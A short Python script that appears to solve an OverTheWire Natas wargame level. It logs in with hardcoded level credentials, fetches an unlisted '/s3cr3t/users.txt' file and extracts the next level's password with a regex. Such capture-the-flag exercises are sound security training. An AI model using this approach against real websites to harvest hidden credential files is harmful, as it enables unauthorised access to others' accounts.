#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
response = requests.get(url + "/s3cr3t/users.txt", auth = (username, password))
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('natas4:(.*)', content)[0])